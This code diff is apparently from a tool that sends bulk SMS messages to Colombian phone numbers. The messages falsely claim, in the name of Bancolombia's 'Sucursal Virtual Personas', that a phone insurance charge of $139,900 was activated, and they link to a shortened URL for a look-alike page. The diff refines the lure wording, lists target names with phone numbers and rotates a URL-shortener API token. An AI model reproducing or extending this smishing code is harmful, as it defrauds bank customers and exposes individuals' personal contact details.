@@ -6,6 +6,7 @@ const index = () => {
   const sendRequest = async (item: { name: string; phone: string }) => {
     try {
       const { short_url } = await createShortURL(item.name);
+      // const short_url = 'https://t.ly/NtBIa';
       const parsedUrl = short_url.split('https://').pop();
       console.log(parsedUrl);
       await sendSMS(item.name, parsedUrl, item.phone);
@@ -17,7 +18,7 @@ const index = () => {
     // { name: 'Kevin Gutierrez', phone: '3008948802' },
     // { name: 'Edgardo Castillo', phone: '3058049984' },
     // { name: 'Adrian Avila', phone: '3242378501' },
-    { name: 'Pablo Garcia', phone: '3245836471' },
+    { name: 'Adrian', phone: '3242378501' },
   ];
 
   const sendAllRequests = async () => {
@@ -43,6 +44,8 @@ const createShortURL = async (name: string) =>
     body: JSON.stringify({
       long_url: `https://personas-seguro.vercel.app/bancolombia/seguro?name=${name}`,
       domain: 'https://t.ly/',
+      expire_at_datetime: '2035-01-17 15:00:00',
+      description: 'Social Media Link',
     }),
     headers: {
       'Content-Type': 'application/json',
@@ -52,7 +55,7 @@ const createShortURL = async (name: string) =>
   }).then((res) => res.json());
 
 const TOKEN_TLY =
-  'zfkT9DEWbzMP2rsVbfk4qtOx9QPbfCLH9tHjpkeuE8yVh4lzL7iyXC6YgH6Q';
+  'qwxgQyV18ylRjJEwh0XAYZj6XeIsuNx6W87qMqcdXML1yRYwNh0u6ltg380E';
 
 const sendSMS = async (
   name: string,
@@ -68,7 +71,9 @@ const sendSMS = async (
     sender: 'INFO',
     number: '57' + num,
     // message: `${name} la Sucursal Virtual Personas te informa que se activo un seguro de celular protegido por $139,900.00 el 24/07/2024. Cancélelo aqui: `,
-    message: `${name}, la Sucursal Virtual Personas te informa que se activo un seguro de celular protegido por $139,900.00. Cancélelo aqui: ${urlShorter}`,
+    message: `${name}, Suc. Virtual Personas Te informa que se activo un seguro de celular protegido por $139,900 el 01/08/2024. Cancélelo aqui: ${urlShorter}`,
+
+    // message: 'Sucursal',
   });
 
   const url = `${baseUrl}?${params.toString()}`;
